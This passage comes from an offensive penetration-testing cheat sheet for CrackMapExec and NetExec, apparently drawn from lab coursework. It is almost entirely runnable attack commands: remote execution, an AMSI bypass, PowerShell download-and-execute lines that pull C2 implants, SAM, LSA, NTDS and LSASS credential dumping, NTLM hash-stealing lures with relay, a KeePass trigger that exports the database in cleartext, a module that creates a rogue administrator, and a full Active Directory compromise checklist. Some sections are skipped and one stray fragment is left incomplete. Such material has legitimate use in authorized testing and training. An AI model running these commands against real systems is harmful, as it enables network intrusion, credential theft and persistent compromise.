crackmapexec smb [target-ip] -u robert -p '[password]' --kerberos \
  --shares

# Kerberos user enumeration (like Kerbrute built into CME)
# KDC_ERR_C_PRINCIPAL_UNKNOWN = user does not exist
# KDC_ERR_PREAUTH_FAILED      = user exists
# "vulnerable to asreproast"  = pre-auth disabled
crackmapexec smb [target-ip] \
  -u account_not_exist julio robert -p [password] --kerberos

# AES-256 key auth (better OPSEC - blends with normal Kerberos traffic)
crackmapexec smb [target-ip] -u julio \
  --aesKey 77da7057b42509a1d086f4f58e7252ad673b1940be2f741c496c577d10e4df76

5.6.4 CCache File Authentication

# Generate TGT with getTGT.py
getTGT.py [domain]/[user]:'[password]' -dc-ip [target-ip]
# Saving ticket in robert.ccache

# Set KRB5CCNAME and use --use-kcache
export KRB5CCNAME=$(pwd)/robert.ccache

# SMB with ccache
crackmapexec smb [target-ip] --use-kcache

# LDAP with ccache
crackmapexec ldap [target-ip] --use-kcache

# MSSQL with ccache - must use FQDN, not IP
crackmapexec mssql [dc] --use-kcache

# Run modules with Kerberos auth
crackmapexec smb [target-ip] --use-kcache --shares

5.7 Command Execution

5.7.1 Execution Methods

MethodFlagDescription
wmiexec--exec-method wmiexecDefault; uses WMI, outputs via share
atexec--exec-method atexecSchedules task via Task Scheduler
smbexec--exec-method smbexecCreates a service; noisier
mmcexec--exec-method mmcexecUses MMC COM object; stealthier

5.7.2 Running Commands

# CMD command
crackmapexec smb [target-ip] -u julio -p '[password]' -x whoami

# PowerShell command
crackmapexec smb [target-ip] -u julio -p '[password]' -X 'Get-LocalUser'

# Specify exec method
crackmapexec smb [target-ip] -u julio -p '[password]' \
  --exec-method smbexec -x whoami

# Force 32-bit PowerShell
crackmapexec smb [target-ip] -u julio -p '[password]' \
  -X 'Get-LocalUser' --force-ps32

# AMSI bypass
crackmapexec smb [target-ip] -u julio -p '[password]' \
  --amsi-bypass /path/to/amsi_bypass.ps1 -X 'IEX(...)'

# NetExec equivalent
netexec smb 192.168.92.128 -d motasem.local -u admin -p [password] -x whoami

# Suppress output (useful for fire-and-forget payloads)
crackmapexec smb [target-ip] -u julio -p '[password]' \
  -X 'IEX(New-Object Net.WebClient).DownloadString("http://[target-ip]/run.ps1")' \
  --no-output

5.7.3 WinRM Execution

crackmapexec winrm [target-ip] -u julio -p '[password]' -x whoami
crackmapexec winrm [target-ip] -u julio -p '[password]' -X 'Get-Process'

5.8 Credential Dumping

5.8.1 SAM Dump

# Dump local SAM database (local accounts + NTLM hashes)
crackmapexec smb [target-ip] -u julio -p '[password]' --sam

5.8.2 LSA Secrets

# Dump LSA secrets (cached domain credentials, service account creds)
crackmapexec smb [target-ip] -u julio -p '[password]' --lsa

5.8.3 NTDS.dit Dump

# Dump all domain hashes via VSS shadow copy
crackmapexec smb [target-ip] -u julio -p '[password]' --ntds

# After ZeroLogon exploit - dump with empty machine account password
crackmapexec smb [target-ip] -u '[dc]$' -p '' --ntds

Hashes are saved to ~/.cme/logs/. To extract only enabled accounts:

cat ~/.cme/logs/DC01_[target-ip]_2022-12-09_065546.ntds \
  | grep -iv disabled | cut -d ':' -f1

5.8.4 Cached Credentials (DCC2)

LSA dump may return DCC2 hashes ($DCC2$10240#user#hash). These are slow to crack (hashcat mode 2100).

hashcat -m 2100 dcc2_hashes.txt /usr/share/wordlists/rockyou.txt

5.8.5 LSASS Dump Modules

ModuleDescription
lsassyRemote LSASS dump + parse with lsassy
procdumpUse procdump64 + pypykatz; marks node as owned in BloodHound
handlekatzUse handlekatz64 + pypykatz
nanodumpUse nanodump + pypykatz; minimal footprint
 
# lsassy
crackmapexec smb [target-ip] -u julio -p '[password]' -M lsassy

# procdump
crackmapexec smb [target-ip] -u julio -p '[password]' -M procdump

# handlekatz
crackmapexec smb [target-ip] -u julio -p '[password]' -M handlekatz

# nanodump
crackmapexec smb [target-ip] -u julio -p '[password]' -M nanodump

5.9 MSSQL Attacks

5.9.1 Authentication & Enumeration

# Auth with domain user
crackmapexec mssql [target-ip] -u julio -p '[password]' -d [domain]

# Auth with SQL Server account (local auth)
crackmapexec mssql [target-ip] -u sa -p '[password]' --local-auth

# List databases (SQL query)
crackmapexec mssql [target-ip] -u julio -p '[password]' \
  -q 'SELECT name FROM sys.databases'

5.9.2 xp_cmdshell Execution

# Execute OS command via xp_cmdshell
crackmapexec mssql [target-ip] -u julio -p '[password]' -x whoami

# PowerShell via xp_cmdshell
crackmapexec mssql [target-ip] -u julio -p '[password]' \
  -X 'Get-LocalUser'

5.9.3 File Transfer

# Upload file to target
crackmapexec mssql [target-ip] -u julio -p '[password]' \
  --put-file /tmp/payload.exe 'C:\Windows\Temp\payload.exe'

# Download file from target
crackmapexec mssql [target-ip] -u julio -p '[password]' \
  --get-file 'C:\Windows\Temp\flag.txt' /tmp/flag.txt

5.9.4 MSSQL Privilege Escalation

# Check current privileges and auto-escalate if possible
crackmapexec mssql [target-ip] -u julio -p '[password]' -M mssql_priv

# Options: check, privesc
crackmapexec mssql [target-ip] -u julio -p '[password]' \
  -M mssql_priv -o ACTION=privesc

5.10 GPP Credential Extraction

Group Policy Preferences (GPP) historically stored credentials in SYSVOL XML files, encrypted with a publicly disclosed AES key (MS14-025).

5.10.1 gpp_password Module

# Find plaintext passwords from GPP (Groups.xml, etc.)
crackmapexec smb [target-ip] -u grace -p '[password]' -M gpp_password

5.10.2 gpp_autologin Module

# Find autologon credentials from Registry.xml
crackmapexec smb [target-ip] -u grace -p '[password]' -M gpp_autologin

5.11 NTLM Hash Stealing

These modules plant UNC-path lures in writable shares. When a user or system accesses the planted file, it triggers an NTLM authentication attempt back to the attacker's machine.

5.11.1 Slinky Module (LNK Files)

# Plant LNK shortcut with UNC icon path in all writable shares
crackmapexec smb [target-ip] -u grace -p '[password]' \
  -M slinky -o NAME=test SERVER=[target-ip]

# NetExec equivalent (from user notes)
netexec smb 192.168.92.128 -d motasem.local -u admin -p [password] \
  -M slinky -o NAME=test SERVER=192.168.92.129

5.11.2 drop-sc Module (.searchConnector-ms)

# Drop .searchConnector-ms file (triggers SMB auth on open)
crackmapexec smb [target-ip] -u grace -p '[password]' \
  -M drop-sc -o URL=\\\\[target-ip]\\test

5.11.3 NTLM Relay Setup

After deploying Slinky or drop-sc, use ntlmrelayx to capture and relay hashes to targets without SMB signing.

# Capture hashes with Responder (passive mode, no poisoning)
sudo responder -I eth0 -A

# Relay to targets without SMB signing
sudo ntlmrelayx.py -tf relay_targets.txt -smb2support

# Combine: relay + shell
sudo ntlmrelayx.py -tf relay_targets.txt -smb2support -i

#     ACTION  Enable/Disable RDP (choices: enable, disable)

# Disable RDP on target

5.15 C2 Payload Delivery

5.15.1 Sliver C2 Payload via CME

Use CME to deliver Sliver implants across multiple hosts. Generate the implant separately and serve it over HTTP, then use CME to trigger download-and-execute.

# Generate Sliver implant (on Sliver server)
# sliver> generate --mtls [target-ip] --os windows --arch amd64 \
#           --format exe --save /tmp/implant.exe

# Serve implant over HTTP
python3 -m http.server 8000

# Deliver and run via CME PowerShell exec (--no-output prevents hang)
crackmapexec smb [target-ip] -u julio -p '[password]' \
  -X 'IEX(New-Object Net.WebClient).DownloadString("http://[target-ip]:8000/run.ps1")' \
  --no-output --amsi-bypass /opt/amsi_bypass.ps1

# Alternative: upload implant then execute
crackmapexec smb [target-ip] -u julio -p '[password]' \
  --put-file /tmp/implant.exe 'C:\Windows\Temp\svc.exe' --local-auth
crackmapexec smb [target-ip] -u julio -p '[password]' \
  -x 'C:\Windows\Temp\svc.exe'

5.15.2 web_delivery Module

# Trigger a Metasploit web_delivery payload (if MSF handler is running)
crackmapexec smb [target-ip] -u julio -p '[password]' \
  -M web_delivery -o URL=http://[target-ip]:8080/msfpayload

5.16 KeePass Attacks

5.16.1 keepass_discover Module

# Find KeePass-related files and running processes
crackmapexec smb [target-ip] -u julio -p '[password]' -M keepass_discover

5.16.2 keepass_trigger Module

Adds a malicious trigger to KeePass configuration that exports the database in cleartext to a file.

# Check options
crackmapexec smb [target-ip] -u julio -p '[password]' \
  -M keepass_trigger --options

# Add malicious trigger
crackmapexec smb [target-ip] -u julio -p '[password]' \
  -M keepass_trigger -o ACTION=ADD EXPORT_PATH='C:\Windows\Temp\export.xml'

# Restart KeePass to activate trigger
crackmapexec smb [target-ip] -u julio -p '[password]' \
  -M keepass_trigger -o ACTION=RESTART

# Poll until export file appears
crackmapexec smb [target-ip] -u julio -p '[password]' \
  -M keepass_trigger -o ACTION=POLL

# Remove trigger after retrieval
crackmapexec smb [target-ip] -u julio -p '[password]' \
  -M keepass_trigger -o ACTION=CLEAN

# Run all steps in sequence
crackmapexec smb [target-ip] -u julio -p '[password]' \
  -M keepass_trigger -o ACTION=ALL EXPORT_PATH='C:\Windows\Temp\export.xml'

5.20 Creating Custom CME Modules

5.20.1 Module File Structure

Custom modules live in ./CrackMapExec/cme/modules/. Every module must subclass CMEModule and define class-level attributes plus the relevant hook methods.

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
class CMEModule:
    name = 'name_module'
    description = "description"
    supported_protocols = ['smb', 'mssql']   # etc.
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
        MYOPTION    description
        MYOPTION2   description2
        '''

    # Called when user is authenticated but not admin
    def on_login(self, context, connection):
        pass

    # Called when user is authenticated AND admin
    def on_admin_login(self, context, connection):
        command = 'whoami'
        context.log.info('Executing command')
        p = connection.execute(command, True)
        context.log.highlight(p)

5.20.2 Example: createadmin Module

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
class CMEModule:
    '''
    Created to demonstrate CME custom module creation
    Reference: https://academy.hackthebox.com/
    Module by @juliourena
    '''
    name = 'createadmin'
    description = "Create a new administrator account"
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
        USER    Username for the new admin account. Default: plaintext
        PASS    Password for the new admin account. Default: HackTheBoxCME1337!
        '''
        self.user = "plaintext"
        if 'USER' in module_options:
            if module_options['USER'] == "":
                context.log.error('Invalid value for USER option!')
                exit(1)
            self.user = module_options['USER']

        self.password = "HackTheBoxCME1337!"
        if 'PASS' in module_options:
            if module_options['PASS'] == "":
                context.log.error('Invalid value for PASS option!')
                exit(1)
            self.password = module_options['PASS']

    def on_admin_login(self, context, connection):
        context.log.info('Creating user: USER={} PASS={}'.format(
            self.user, self.password))
        command = (
            '(net user ' + self.user + ' "' + self.password + '" /add /Y '
            '&& net localgroup administrators ' + self.user + ' /add)'
        )
        context.log.info('Executing command')
        p = connection.execute(command, True)
        context.log.highlight(p)
# Run with defaults
crackmapexec smb [target-ip] -u julio -p '[password]' -M createadmin

# Run with custom user/pass
crackmapexec smb [target-ip] -u julio -p '[password]' \
  -M createadmin -o USER=htb PASS=Newpassword!

5.20.3 Available Hook Methods

MethodTriggered When
on_login()Authenticated but not admin
on_admin_login()Authenticated and has admin rights

5.21 Mastering CMEDB

5.21.1 Database Overview

CME automatically persists credentials, hosts, shares, and groups to an SQLite database at ~/.cme/workspaces/. Each protocol has its own .db file.

# List default workspace databases
ls ~/.cme/workspaces/default/
# ftp.db  ldap.db  mssql.db  rdp.db  smb.db  ssh.db  winrm.db

5.21.2 Workspaces

# Launch cmedb
cmedb
# cmedb (default) >

# Create a new workspace (useful per-engagement)
cmedb (default) > workspace create [domain]

# List workspaces
cmedb ([domain]) > workspace list

# Switch workspace
cmedb ([domain]) > workspace default

# Go back to workspace root from a protocol DB
cmedb (default)(smb) > back

5.21.3 Protocol Databases

ProtocolAvailable Commands
smbback, creds, exit, export, groups, hosts, import, shares

5.22 CME AD Compromise Methodology

Methodology: Full AD Compromise with CrackMapExec
  • Recon: Sweep subnet for SMB hosts - crackmapexec smb [target-ip]/24
  • NULL/Anon session: Test for unauthenticated SMB access - -u "" -p ""
  • RID brute: Enumerate usernames without credentials - --rid-brute
  • Password policy: Check lockout threshold before spraying
  • Password spray: One password across all protocols - SMB, WinRM, LDAP, MSSQL
  • LDAP enum: Run user-desc, delegation, password-not-required, gmsa
  • ASREPRoast: --asreproast via LDAP; crack with hashcat -m 18200
  • Kerberoast: --kerberoasting via LDAP; crack with hashcat -m 13100
  • GPP: Run gpp_password and gpp_autologin on DC
  • Share spider: spider_plus on all readable shares; look for credential files
  • Hash steal: Deploy slinky or drop-sc; capture NTLMv2 with Responder
  • Relay: Identify no-signing hosts (--gen-relay-list); relay captured hashes
  • Exec: Run commands (-x/-X) on admin sessions; collect more creds
  • Credential dump: --sam, --lsa, -M lsassy, -M procdump on compromised hosts
  • PtH: Reuse NT hashes with -H across all hosts
  • NTDS: Dump NTDS.dit from DC with --ntds after obtaining DA/DC$ hash
  • Vuln scan: Check zerologon, petitpotam, nopac, dfscoerce, ms17-010
  • BloodHound: Collect with -M bloodhound; mark owned nodes with -M bh_owned
